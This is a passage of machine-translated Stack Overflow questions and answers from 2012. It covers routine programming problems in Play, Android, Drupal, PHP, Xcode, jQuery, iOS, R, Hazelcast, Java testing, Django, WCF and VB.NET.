    at play.mvc.ActionInvoker.invoke(ActionInvoker.java:502)
    at play.mvc.ActionInvoker.invokeControllerMethod(ActionInvoker.java:478)
    at play.mvc.ActionInvoker.invokeControllerMethod(ActionInvoker.java:473)
    at play.mvc.ActionInvoker.invoke(ActionInvoker.java:161) 
```

**更新 3：**

```
Oops: RuntimeException
An unexpected error occured caused by exception RuntimeException: play.exceptions.UnexpectedException: Unexpected Error

play.exceptions.UnexpectedException: Unexpected Error
    at play.data.validation.ValidationPlugin.beforeActionInvocation(ValidationPlugin.java:59)
    at play.plugins.PluginCollection.beforeActionInvocation(PluginCollection.java:594)
    at play.mvc.ActionInvoker.invoke(ActionInvoker.java:134)
    at Invocation.HTTP Request(Play!)
Caused by: java.lang.RuntimeException: play.exceptions.UnexpectedException: Unexpected Error
    at play.modules.morphia.Model.create(Model.java:73)
    at play.modules.morphia.MorphiaPlugin.bind(MorphiaPlugin.java:601)
    at play.PlayPlugin.bind(PlayPlugin.java:68)
    at play.plugins.PluginCollection.bind(PluginCollec 
```

帮助？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T20:15:55.980

我认为这更多是关于 JSON 绑定而不是 morphia 问题。AFAIK，play 1.x 不支持 JSON 自动绑定。所以可能你需要的是：

```
public static void Update(String myData){
   MyModel model = new Gson().fromJSON(myData, MyModel.class);
   ...
} 
```

在您的客户端，您必须发送一个名为“myData”的 ajax 消息：

```
$.post("the/url", {myData: {...}}, function(response){...}); 
```

# android - 在 TabHost 中配置多个活动，每个活动都包含一个 GLSurfaceView

> ID：10603220
> 
> 赞同：0
> 
> 时间：2012-05-15T14:45:17.960
> 
> 标签：android, android-tabhost, glsurfaceview

我的设置如下：一个 TabHost 有两个子活动，每个活动都有一个 GLSurfaceView 作为内容。这两个活动当然是将它们的 onPause() 和 onResume() 事件转发到它们的 GLSurfaceViews。

第一个活动按预期工作，但切换到另一个选项卡没有视觉影响。LogCat 显示 onSurfaceCreated()、onSurfaceChanged() 和 onSurfaceDraw() 都按预期在两个 GLSurfaceView 实例上被调用。

“修复”是分别在 onPause() 和 onResume() 中使用 setVisibility(View.INVISIBLE/VISIBLE) 设置每个 GLSurfaceView 的可见性。这会导致显示正确的视图，但缺点是在更改选项卡时会导致闪烁效果。当 GLSurfaceView 完成更多工作时，这一点尤其明显。

本质上，我怎样才能避免设置 GLSurfaceViews 的可见性？

选项卡活动：

```
 public void onCreate(Bundle savedInstanceState) {
      super.onCreate(savedInstanceState);
      setContentView(R.layout.mainactivity);

      TabHost tabHost = getTabHost();
      TabHost.TabSpec spec;
      Intent intent;

      // First Vortex view
      intent = new Intent().setClass(this, VortexActivity.class);
      spec = tabHost.newTabSpec("A")
            .setIndicator("A")
            .setContent(intent);
      tabHost.addTab(spec);

      // Second Vortex view
      intent = new Intent().setClass(this, VortexActivity.class);
      spec = tabHost.newTabSpec("B")
            .setIndicator("B")
            .setContent(intent);
      tabHost.addTab(spec);
} 
```

儿童活动：

```
 public class VortexActivity extends Activity {

        private GLSurfaceView view;

      /** Called when the activity is first created. */
      @Override
      public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        view = new GLSurfaceView(this);
        view.setRenderer(new VortexRenderer());
            setContentView(view);
        }

      @Override
      public void onResume() {
        super.onResume();
        view.onResume();
        //view.setVisibility(View.VISIBLE);
      }

      @Override
      public void onPause() {
        super.onPause();
        view.onPause();
        //view.setVisibility(View.INVISIBLE);
      }

    } 
```

渲染器：

```
 public class VortexRenderer implements GLSurfaceView.Renderer {
        public void onSurfaceCreated(GL10 glArgument, EGLConfig config) {
        }
        public void onSurfaceChanged(GL10 gl, int w, int h) {
        }
        public void onDrawFrame(GL10 gl) {
            long ms = System.currentTimeMillis() % 2000;
            if(ms > 1000)
                ms = 1000 - (ms - 1000);
            float intensity = ms / 500.0f;
            gl.glClearColor(intensity, intensity, intensity, 1.0f);
            gl.glClear(GL10.GL_COLOR_BUFFER_BIT);
        }
    } 
```

布局：

```
<?xml version="1.0" encoding="utf-8"?>
<TabHost xmlns:android="http://schemas.android.com/apk/res/android"
android:id="@android:id/tabhost"
android:layout_width="fill_parent"
android:layout_height="fill_parent" >

<LinearLayout
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical"
    android:padding="0dp" >

    <FrameLayout
        android:id="@android:id/tabcontent"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_weight="1"
        android:padding="0dp" />

    <TabWidget
        android:id="@android:id/tabs"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_weight="0"
        android:padding="0dp" />
</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-16T02:27:57.817

另一个解决方法是拥有一个始终可见的 GLSurfaceView，并让它切换它正在显示的内容。

# jquery - 允许节点表单多次提交

> ID：10603231
> 
> 赞同：1
> 
> 时间：2012-05-15T14:45:43.753
> 
> 标签：jquery, ajax, drupal

使用 Drupal 7，我遇到了 Drupal 不允许节点表单提交两次的问题。场景：

*   我显示一个节点表单并使用 Drupal 的 ajax 框架通过 use-ajax-submit 功能处理提交。

*   我第一次提交表单时，它可以工作，没问题。

*   第二次提交表单时，我收到以下消息：

    “此页面上的内容要么已被其他用户修改，要么您已经使用此表单提交了修改。因此，您的更改无法保存。”

我知道这是预期的行为，并且正在尝试找到解决方法。我似乎记得 Drupal 6 中有一个表单属性，它允许在构建表单时多次提交，但在 Drupal 7 中找不到任何关于它的信息。

希望任何人都可以分享任何建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-16T02:10:24.297

我解决了这个！查看节点模块，结果是`node_validate`根据`form_state`变量中的值检查上次提交的时间。我为表单编写了一个自定义验证处理程序，它绕过了该`node_validate`函数并允许节点表单多次提交。

```
 /**
 * Sets up a node form so that it can be submitted more than once through an ajax interface
 * @param unknown_type $form
 * @param unknown_type $form_state
 */
function MYMODULE_allow_multisubmit (&$form, &$form_state){

  // set this as a custom submit handler within a form_alter function
  // set the changed value of the submission to be above the last updated time
  // to bypass checks in the node_validate
  $check = node_last_changed($form_state['values']['nid']);
  $form_state['values']['changed'] = $check + 120;

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-07T09:43:49.910

drupal 7 中不存在 hook_allow_multisubmit

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-05-08T11:56:24.833

这是我最近遇到的一个问题，所以我将添加一个“更完整”版本的 Mark Weitz 的答案，它确实有效。

首先，您需要为您键入的内容更改节点形式

```
//Implements hook_form_alter()
function MYMODULE_form_alter(&$form, &$form_state, $form_id){

    //Check form is the node add/edit form for the required content type
    if($form_id == "MYCONTENTTYPE_node_form"){

        //Append our custom validation function to the forms validation array
        //Note; We must use array_unshift so our function is called first.
        array_unshift($form['#validate'], 'my_custom_validation_function');

    }

} 
```

现在要定义自定义验证函数，它将修复错误：

*“此页面上的内容要么已被其他用户修改，要么您已经使用此表单提交了修改。因此，您的更改无法保存。”*

```
//Our custom validation function
function my_custom_validation_function($form, &$form_state){

    //Drupal somewhere in this validation chain will check our $form_state
    //variable for when it thinks the node in question was last changed,
    //it then determins when the node was actually changed and if the $form_state
    //value is less than the drupal value it throws the 'Cant edit' error.
    //To bypass this we must update our $form_state changed value to match the actual
    //last changed value. Simple stuff really...

    //Lets do the above ^^
    $form_state['values']['changed'] = node_last_changed($form_state['values']['nid']);

    //Any other extra validations you want to do go here.

} 
```

显然，这并非没有风险，因为现在我们选择的内容类型人们能够覆盖彼此的工作。假设他们正在同时编辑节点。

# php - 在 PHP 中使用带有长正则表达式的 FILTER_VALIDATE_REGEX 时出现分段错误

> ID：10603237
> 
> 赞同：1
> 
> 时间：2012-05-15T14:46:00.043
> 
> 标签：php

运行以下 PHP 代码时，我得到一个 "Segmentation fault: 11" ：

```
$pattern = '#^([\+-]?\d{4}(?!\d{2}\b))((-?)((0[1-9]|1[0-2])(\3([12]\d|0[1-9]|3[01]))?|W([0-4]\d|5[0-2])(-?[1-7])?|(00[1-9]|0[1-9]\d|[12]\d{2}|3([0-5]\d|6[1-6])))([T\s]((([01]\d|2[0-3])((:?)[0-5]\d)?|24\:?00)([\.,]\d+(?!:))?)?(\17[0-5]\d([\.,]\d+)?)?([zZ]|([\+-])([01]\d|2[0-3]):?([0-5]\d)?)?)?)?$#';
$horas = "2012-05-15 11:23:56";
echo filter_var($horas, FILTER_VALIDATE_REGEXP, array("options" => array('regexp' => $pattern))) ? "1" : "2"; 
```

如果我使用较短的正则表达式，则不会出现任何分段错误：

```
$pattern = '#^([\+-]?\d*)$#';
$horas = "2012-05-15 11:23:56";
echo filter_var($horas, FILTER_VALIDATE_REGEXP, array("options" => array('regexp' => $pattern))) ? "1" : "2"; 
```

在这种情况下，值为“2”。

我决定使用 strace（或 dtruss，因为我使用的是 OSX）并比较不同正则表达式的输出。虽然我不知道从哪里开始，但我意识到第一个脚本停在这里：

```
open("/opt/local/lib/libmemcached.9.dylib\0", 0x0, 0x0)      = 3 0
pread(0x3, "\317\372\355\376\a\0", 0x1000, 0x0)      = 4096 0
mmap(0x103532000, 0x24000, 0x5, 0x12, 0x3, 0x100001F)        = 0x3532000 0
mmap(0x103556000, 0x1000, 0x3, 0x12, 0x3, 0x100001F)         = 0x3556000 0
mmap(0x103557000, 0x15098, 0x1, 0x12, 0x3, 0x100001F)        = 0x3557000 0
close(0x3)       = 0 0
stat64("/opt/local/lib/libsasl2.2.dylib\0", 0x7FFF61CDD430, 0x7FFF61CDE2B0)      = 0 0
open("/opt/local/lib/libsasl2.2.dylib\0", 0x0, 0x0)      = 3 0
pread(0x3, "\317\372\355\376\a\0", 0x1000, 0x0)      = 4096 0
mmap(0x10356D000, 0x14000, 0x5, 0x12, 0x3, 0x100001F)        = 0x356D000 0
mmap(0x103581000, 0x1000, 0x3, 0x12, 0x3, 0x100001F)         = 0x3581000 0
mmap(0x103582000, 0x3848, 0x1, 0x12, 0x3, 0x100001F)         = 0x3582000 0
close(0x3)       = 0 0
__sysctl(0x7FFF61CDE14C, 0x2, 0x7FFF61CDE138)        = 0 0 
```

我不确定这是否有帮助，或者它是否与 libsasl 有关。我最近使用 macports 升级了 php5、apache2 和其他一些软件包。此代码用于在升级之前工作。这是 php -version 的输出：

PHP 5.3.12 (cli) (built: May 11 2012 14:31:01) Copyright (c) 1997-2012 The PHP Group Zend Engine v2.3.0, Copyright (c) 1998-2012 Zend Technologies with Xdebug v2.2.0,版权所有 (c) 2002-2012，Derick Rethans 和 Suhosin v0.9.33，版权 (c) 2007-2012，SektionEins GmbH

先感谢您。

# xcode - 对于 Xcode 项目，是否也可以将 .xcodeproj 文件添加到源代码管理中？

> ID：10603238
> 
> 赞同：7
> 
> 时间：2012-05-15T14:46:01.027
> 
> 标签：xcode, git, svn, version-control

我正在使用 Xcode 4.3.2 并意识到项目文件没有添加到 git repo，所以我添加了它们并提交：（有 6 个文件）

```
# On branch master
# Changes to be committed:
#   (use "git reset HEAD <file>..." to unstage)
#
#   new file:   Proj01.xcodeproj/project.xcworkspace/contents.xcworkspacedata
#   new file:   Proj01.xcodeproj/project.xcworkspace/xcuserdata/jeremy.xcuserdatad/UserInterfaceState.xcuserstate
#   new file:   Proj01.xcodeproj/project.xcworkspace/xcuserdata/jeremy.xcuserdatad/WorkspaceSettings.xcsettings
#   new file:   Proj01.xcodeproj/xcuserdata/jeremy.xcuserdatad/xcdebugger/Breakpoints.xcbkptlist
#   new file:   Proj01.xcodeproj/xcuserdata/jeremy.xcuserdatad/xcschemes/FlipCard.xcscheme
#   new file:   Proj01.xcodeproj/xcuserdata/jeremy.xcuserdatad/xcschemes/xcschememanagement.plist 
```

但这样做实际上是一个好习惯吗？（有一次 Xcode 崩溃了，文件夹 .xcodeproj 不见了）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T14:52:39.463

如前所述，您的 .xcodeproj 非常重要，应该包含在您的提交中

我只想添加这个关于在 git 中使用 xcode 的链接，这对我有很大帮助：[http ://shanesbrain.net/2008/7/9/using-xcode-with-git](http://shanesbrain.net/2008/7/9/using-xcode-with-git)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-15T15:14:03.137

添加`project.pbxproj`文件很重要，但`.xcodeproj`捆绑包中的任何其他内容都不*需要*受版本控制。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-15T14:49:22.047

好吧，由于所有文件引用、构建设置、目标选项都保存在 .xcodeproj 文件中，是的，您应该将它包含在您的存储库中。我通常排除大多数（如果不是全部）用户特定文件，例如断点、用户界面状态等。

# jquery - 如果值为 0、00、000 等，如何使用 jquery 删除输入字段中的内容？

> ID：10603239
> 
> 赞同：3
> 
> 时间：2012-05-15T14:46:01.060
> 
> 标签：jquery, html

我有一个只允许使用数字的价格字段。我在头部使用以下代码：

```
jQuery(document).ready(function($) {
    jQuery('#item_price').keyup(function () { 
       this.value = this.value.replace(/[^0-9]/g,'');
    });
}); 
```

这是我的领域：

```
<input type="text" minlength="2" id="item_price" name="item_price"> 
```

我现在要做的是强制该字段为空，如果该人键入 0 或 00 或 000 等等......但不会弄乱包含 0 但实际上是特定价格的数字（例如 300 , 10250, 10)。

有什么办法可以做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T14:48:25.623

尝试检查该值是否为数字`0`。

```
if(parseInt(this.value, 10) === 0){
    this.value = '';
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T14:51:59.823

这对你有用吗？

```
jQuery('#item_price').keyup(function () { 
  this.value = this.value.replace(/[^0-9]/g,'');
  this.value = this.value.replace(/^[0]+/g,'');
});​ 
```

[**演示**](http://jsfiddle.net/PmVPg/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T14:50:49.440

```
jQuery(document).ready(function() {
    jQuery('#item_price').keyup(function() {
        var $this = $(this);
        if (/^0+$/.test($this.val()) {
            $this.val('');
        }
    });
}); 
```

# ios - 如何获取对 .nib 文件中对象的引用？

> ID：10603241
> 
> 赞同：3
> 
> 时间：2012-05-15T14:46:09.170
> 
> 标签：ios, xcode, cocoa-touch, nib, iboutlet

到目前为止，我已经在代码中完成了大多数视图编程，但是在代码中完美定位按钮确实很麻烦。我搜索了一段时间，也许我在搜索时使用了错误的词？无论如何，我在一个 nib 文件中创建了一个 UI，它有几个按钮。我将 .nib 文件加载到我的视图中，如下所示：

```
NSArray* nibViews =  [[NSBundle mainBundle] loadNibNamed:@"UCMenuView" owner:self options:nil];
UIView *menuView = [nibViews objectAtIndex:0];
self.delegate = (id<UCMapviewDelegate>)delegate;
// another controller does the view switching, so I'm sending him the view  
[self.delegate pushView:menuView]; 
```

这可以'。但我不明白如何获得指向按钮的指针。我知道 IBOutlet，但是如何将它们连接到 .nib 中的元素？我如何将它连接`@property (strong, nonatomic) IBOutlet UIButton *calendar;` 到 .nib 中的特定按钮？

我试图 ctrl-drag （从@property 左侧的那个小点，但这不起作用（从任何一方）。如果这是一个简单的问题，请原谅，但我找不到明确的解释

感谢您的帮助

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T14:55:36.390

1.  `UIView *menuView`您需要为此创建一个自定义 UIView 子类，而不仅仅是一个`UCMenuView`. 在此自定义类上定义您的属性。
2.  在编辑器中打开您的 .xib 文件，在左栏中选择**文件的所有者**，并将其在身份检查器中的**自定义类**`UCMenuView`设置为.
3.  右键单击左栏中的**File's Owner ，然后连接您的 IBOutlets。**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T14:51:54.530

查看本教程： http: [//developer.apple.com/library/ios/#documentation/IDEs/Conceptual/Xcode4TransitionGuide/InterfaceBuilder/InterfaceBuilder.html](http://developer.apple.com/library/ios/#documentation/IDEs/Conceptual/Xcode4TransitionGuide/InterfaceBuilder/InterfaceBuilder.html) 或 [http://www.hongkiat.com/blog/ios-development- guide-part2-your-first-app/](http://www.hongkiat.com/blog/ios-development-guide-part2-your-first-app/)

亲切的问候，博

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T14:52:23.197

请参阅 Apple 的文档：[Creating and Connecting an Outlet](http://developer.apple.com/library/mac/#recipes/xcode_help-interface_builder/CreatingOutlet.html) and more generaling [Designing User Interfaces in Xcode](https://developer.apple.com/library/mac/#documentation/ToolsLanguages/Conceptual/Xcode4UserGuide/InterfaceBuilder/InterfaceBuilder.html)。

# r - xts中的拆分功能

> ID：10603245
> 
> 赞同：1
> 
> 时间：2012-05-15T14:46:23.737
> 
> 标签：r, time-series, finance, xts

我不明白为什么 split 应用于 xts 会给出一个列表列表。它应该返回 xts 对象。有什么我想念的吗？

```
data(sample_matrix)
x <- as.xts(sample_matrix)
spl<-split(x, f="days")
class(spl)
 [1] "list"
class(spl[1])
 [1] "list"
class(x)
 [1] "xts" "zoo" 
```

编辑：我想重建 xts，并在将其拆分为几天后计算出一个新字段。问题是现在我的计算采用“拆分”格式，即在列表列表中。如何从列表列表中“重建” xts？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T14:48:25.783

尝试

```
> class(spl[[1]])
[1] "xts" "zoo" 
```

`split(x, 'days')`创建`xts`对象列表。`[[`运算符用于从列表中提取元素。

编辑以解决您的编辑：

```
do.call(rbind, spl) 
```

（如果这没有意义，那么提供一个可重现的例子）

# spring - 在客户端中使用 MapLoader 获取 Hazelcast 分布式地图

> ID：10603254
> 
> 赞同：4
> 
> 时间：2012-05-15T14:47:02.680
> 
> 标签：spring, hazelcast

我正在评估 Hazelcast 作为我正在开发的应用程序的分布式数据网格解决方案。Hazelcast 设置在分布式集群上，我的应用程序使用 Spring 以这种方式定义 Hazelcast 客户端：

```
<hz:client id="hazelcastClient" group-name="dev" group-password="dev-pass">
  <hz:member>localhost:5701</hz:member>
</hz:client> 
```

在我的 Hazelcast 节点上，`hazelcast.xml`我在文件中设置了一张地图，其中包含所需的所有配置。假设这张地图被称为`myMap`. 使用 Hazelcast webapp 进行监控（mancenter）时，我可以看到此地图设置正确。

我现在必须在应用程序端配置映射以注入到我的 bean 中。如果我做类似的事情

```
<hz:map id="myMap" instance-ref="hazelcastClient" name="myMap" /> 
```

我将这张地图注入到包含获取逻辑的 bean 中，我没有遇到任何问题。

但是，我还编写了一个实现`MapLoader`接口的类，以处理缓存中丢失的数据。我现在的问题是我不知道如何将它`Maploader`与我定义的缓存联系起来。如果我尝试类似

```
<hz:map id="myMap" instance-ref="hazelcastClient" name="myMap">
  <hz:map-store enabled="true" implementation="myMapLoader"/>
</hz:map> 
```

我收到一个 XML 解析错误，因为似乎当`hz:map`用作顶级元素（而不是在 a`hz:config`中，例如）时，您无法指定内部元素。这让我觉得你需要定义一个`hz:config`元素。但是，如果您可以`hz:config`为客户定义一个元素，则从文档中不是很清楚。`hz:config`对我来说，如果您希望您的应用程序成为集群的一部分，您似乎需要使用。但是，我不确定我的应用程序应该成为集群的一部分在逻辑上是否正确 - 它基本上是数据网格的客户端。

您对如何配置我的应用程序以实现我想要的行为有任何想法吗？

谢谢！

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-05-16T05:31:57.770

您**不能**在客户端配置地图。您应该在 Hazelcast 节点上配置`myMap`及其。`MapLoader/MapStore`MapStore/MapLoader 操作由拥有数据的 Hazelcast 节点执行，而不是由客户端执行。

> **Hazelcast 节点**

```
<hz:config>
    ...
    <hz:map name="myMap" backup-count="1" max-size="0">
        <hz:map-store enabled="true" implementation="myMapLoader" />
    </hz:map>
    ...
</hz:config> 
```

-或- 使用 hazelcast.xml

```
<map name="myMap">
    <backup-count>1</backup-count>
    <time-to-live-seconds>0</time-to-live-seconds>
    <max-idle-seconds>0</max-idle-seconds>

    <map-store enabled="true">
        <class-name>foo.bar.MyMapLoader</class-name>
        <write-delay-seconds>0</write-delay-seconds>
    </map-store>
</map> 
```

在客户端只是实例化`myMap`；

```
<hz:map id="myMap" instance-ref="hazelcastClient" name="myMap" /> 
```

当客户端放入/获取该地图时，处理客户端请求的节点将调用 MapLoader/MapStore。

# java - Java测试验证构造函数

> ID：10603255
> 
> 赞同：2
> 
> 时间：2012-05-15T14:47:04.443
> 
> 标签：java, junit, mocking, mockito, powermock

我试图找出一种方法来通过以下方式验证类构造函数（请记住，这是一个理论示例）

```
public MyClass extends ItemContainer {

   public MyClass(RoundItem a, SquareItem b) {
      addItem(a);
      addItem(b); 
   }
} 
```

我想验证构造函数调用 addItem 一次与 any(RoundItem.class) 并一次与 any(SquareItem.class)。我似乎找不到用 PowerMock 或 Mockito 以这种方式验证构造函数的好方法。有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:18:02.557

你真的不需要一个模拟框架来测试它。您可以制作[Test Spy](http://xunitpatterns.com/Test%20Spy.html)对象。

例如 ：

```
@Test
public void testMyClassConstruction() throws Exception {
  MyClass myClass = new MyClass() {
    public int size() {
      return items.size();
    }
  }

  assertEquals(2, myClass.size());
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T14:50:21.820

首先，您应该注意不要将任何逻辑放入构造函数中。（为了不测试它们。项目`a`和`b`可能由客户端代码放入容器中（您实际上可以使用模拟框架来测试它，但有更简单的方法来做到这一点）。

考虑查看[Misko Hevery 的一](http://misko.hevery.com/)组关于测试的讲座，以获得足够的背景来正确进行单元测试。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-08-17T20:03:04.307

```
new Verifications() {
           {        
            addItem(a); times=1;
            addItem(b); times=1;
            }
        }; 
```

这样您就可以测试是否调用了方法。在此您可以模拟对象“a”和“b”

或者你可以使用“withInsatceLike”

前任：

```
 addItem(withInsatceLike(a)); 
```

希望这可以帮助

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-15T14:52:35.987

Mockite 纯粹用于 Mocking 目的，如果您想测试其他东西，我建议您看看 JUnit。它是 Java 最好的测试框架之一。否则，您总是可以在构造函数中只使用 System.out.print 来找出它被调用的次数。

# django - Django 更新条目

> ID：10603257
> 
> 赞同：0
> 
> 时间：2012-05-15T14:47:15.457
> 
> 标签：django, django-models

为什么我使用获取条目时无法保存条目`filter`？如果我用`get`.

我需要使用`filter`，因为我正在使用序列化程序返回 JSON 对象。并且 Django 的序列化器不喜欢它不是 QuerySet。

```
message = UserMessage.objects.filter(id=request.GET['msg_id'])
message[0].read = True
message[0].save() 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T14:58:14.317

您可以使用查询[集更新方法](https://docs.djangoproject.com/en/dev/ref/models/querysets/#update)：

```
UserMessage.objects.filter(id=request.GET['msg_id']).update(read=True) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:05:43.437

除非`message`被评估并因此被缓存，否则`message[0]`总是命中 DB，例如

```
>>> qs = User.objects.all()
>>> qs[0] is qs[0]
False
>>> bool(qs) # evaluate, len(qs) or iterating on qs also do
>>> qs[0] is qs[0]
True 
```

你可以将它分配给变量

```
message = UserMessage.objects.filter(id=request.GET['msg_id'])[0]
message.read = True
message.save() 
```

或`update`直接使用，如 jpic 建议的那样：

```
UserMessage.objects.filter(id=request.GET['msg_id']).update(read=True) 
```

# c++ - 在 XCode 中使用 C++ 代码

> ID：10603260
> 
> 赞同：1
> 
> 时间：2012-05-15T14:47:27.407
> 
> 标签：c++, ios, xcode

我尝试将 C++ 库导入 XCode，我将 .cpp 重命名为 .mm，但是当我尝试编译时，它显示如下错误：

**DateOps.h:23：错误：在 'DateOps' 之前需要 '='、','、';'、'asm' 或 '_*属性_'***

DateOps.h 文件的开头

```
#if !defined( DATE_OPS__H )
#define DATE_OPS__H

typedef int MonthDays[13];

typedef long YearEndDays[2];

class DateOps {
public:
  enum CalendarType {
    T_GREGORIAN = 0,
    T_JULIAN = 1,
  }; 
```

...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:05:47.773

如果您只需要将几个文件编译为 Objective-C++，那么[WrightsCS 给出的答案就](https://stackoverflow.com/a/10603441/1304626)可以正常工作。但是，如果您有很多文件要以这种方式编译，或者认为您的项目将来会变得更大，您可以更改所有文件的编译语言：

转到目标的**Build Settings**，在**Language**部分下查找名为**Compile Sources As**的设置。通常它设置为“根据文件类型”（它应该与 .mm 扩展名一起使用，但我之前看到过它仍然编译为 Objective-C 的错误）。您可以通过更改此设置将其强制为“Objective-C++”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T14:57:01.900

您需要在您所指的 .mm 文件上设置`-x objective-c++`为**编译器标志。**

![在此处输入图像描述](../Images/6ed45c72c15bb78a8af65f433931172b.png)

# c# - WCF 服务对象序列化

> ID：10603261
> 
> 赞同：8
> 
> 时间：2012-05-15T14:47:28.757
> 
> 标签：c#, wcf, silverlight, inheritance

我有一个名为contact 的抽象类和另一个从contact 继承的名为client 的类。我正在处理一个 WCF 服务，该方法采用一个类型为联系的参数的方法。但是我拥有的是我想要传递的客户端实例。我面临这个错误：

> 不需要输入数据合同名称为“Client:http://schemas.datacontract.org/2004/07/xxx”的“xxx.Client”。将任何静态未知的类型添加到已知类型列表中 - 例如，通过使用 KnownTypeAttribute 属性或将它们添加到传递给 DataContractSerializer 的已知类型列表中。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-15T14:52:08.207

您需要让 DataContractSerializer 知道 a`Client`是`Contact`.

有几种方法可以做到这一点，但它们都围绕着使用一个[`KnownType`](http://msdn.microsoft.com/en-us/library/ms730167.aspx)或多个[`ServiceKnownType`](http://msdn.microsoft.com/en-us/library/system.servicemodel.serviceknowntypeattribute.aspx)属性。

`KnownType`可以放在类上`Client`告诉 DataContractSerializer 它是一个 KnownType `Contact`。

```
[DataContract]
[KnownType(typeof(Client))]
public class Contact{} 
```

也可以放在一个类上，`KnownType`以表明在序列化这个类时你也可能遇到这个其他类。

`DataContract`如果你有一个类的属性是 a `Contact`，实际上可能包含 a ，你可能想要这样做`Client`：

```
[DataContract]
[KnownType(typeof(Client))]
public class Meeting
{
    Contact MeetingContact{get;}
} 
```

在这种情况下，您无需在客户端上指定 KnownType 就可以逃脱。如果您有一个返回集合的属性并且您想指定可以在集合中的类型，您可能还想这样做。

您可以不指定 KnownType 的实际类型，而是指定将返回已知类型的静态方法的名称：

```
[DataContract]
[KnownType("GetKnownTypes")]
public class Meeting
{
    Contact MeetingContact{get;}

    private static Type[] GetKnownType()
    {
    return new Type[]{typeof(Client)};
    }
} 
```

也可以通过[配置文件](https://stackoverflow.com/questions/2409497/how-to-add-service-known-types-from-external-config-file)指定已知类型。

ServiceKnownTypes 以类似的方式工作，但在服务本身上指定：

```
[ServiceKnownType(typeof(Client))]
[ServiceContract()]
public interface IMyServiceContract
{

    [OperationContract]
    Contact GetContact();
} 
```

此设置将使 DataContactSerializer 知道任何方法都可能返回 type 类型`Client`。以与已知类型类似的方式，您还可以使用静态方法来提供已知类型的服务。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-15T14:51:29.070

WCF 不直接作用于抽象类。您应在数据合同或服务类上使用 KnownType 属性。以下是示例；

```
[DataContract]
[KnownType(typeof(Client))]
public class Contact
{
   ...
}

[ServiceContract]
[ServiceKnownType(typeof(Client))]
public interface IMyService
{
    contact getcontact(Guid id);
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-15T14:50:48.807

使用[[KnownType]](http://msdn.microsoft.com/en-us/library/ms730167.aspx)和[[ServiceKnownType]](http://msdn.microsoft.com/en-us/library/system.servicemodel.serviceknowntypeattribute.aspx)属性来确保关系。

# c# - 使用数据集将 xml 转换为树视图

> ID：10603269
> 
> 赞同：2
> 
> 时间：2012-05-15T14:47:40.347
> 
> 标签：c#, asp.net, xml, vb.net, xpath

我有一个具有以下结构的 xml 文件：

```
<table name="tblcats">
    <row>
        <Id>3680</Id>
        <Industry>Associations</Industry>
        <ParentId>1810</ParentId>
    </row>
    <row>
        <Id>1592</Id>
        <Industry>Fortune 100</Industry>
        <ParentId>1810</ParentId>
    </row>
    <row>

</table> 
```

我想使用这个 xml 填充树视图。我创建了一个数据集并对其进行了排序并编写了以下代码：

```
 Dim xmlfile As String = Server.MapPath("~/App_Data/Industries.xml")
        Dim ds As New DataSet()
        ds.ReadXml(xmlfile)

        Dim sortedRows As DataRow()
        sortedRows = ds.Tables(1).Select("", "ParentId")

        Dim XDoc As New XmlDocument()
        Dim XDec As XmlDeclaration = XDoc.CreateXmlDeclaration("1.0", Nothing, Nothing)
        XDoc.AppendChild(XDec)

        ' iterate through the sorted data
        ' and build the XML document
        For Each Row As DataRow In sortedRows
            ' create an element node to insert
            ' note: Element names may not have spaces so use ID
            ' note: Element names may not start with a digit so add underscore
            Dim NewNode As XmlElement = XDoc.CreateElement("_" & Row("Id").ToString())
            NewNode.SetAttribute("Id", Row("Id").ToString())
            NewNode.SetAttribute("ParentId", Row("ParentId").ToString())
            NewNode.SetAttribute("Industry", Row("Industry").ToString())

            ' special case for top level node
            If CInt(Row("ParentId")) = -1 Then
                XDoc.AppendChild(NewNode)
            Else
                ' root node
                ' use XPath to find the parent node in the tree
                Dim SearchString As [String]
                SearchString = [String].Format("//*[@Id=""{0}""] ", Row("ParentId").ToString())
                Dim Parent As XmlNode = XDoc.SelectSingleNode(SearchString)

                If Parent IsNot Nothing Then
                    Parent.AppendChild(NewNode)
                Else

                    ' Handle Error: Employee with no boss
                End If
            End If
        Next

        ' we cannot bind the TreeView directly to an XmlDocument
        ' so we must create an XmlDataSource and assign the XML text
        Dim XDdataSource As New XmlDataSource()
        XDdataSource.ID = DateTime.Now.Ticks.ToString()
        ' unique ID is required
        XDdataSource.Data = XDoc.OuterXml

        ' we want the full name displayed in the tree so 
        ' do custom databindings
        Dim Binding As New TreeNodeBinding()
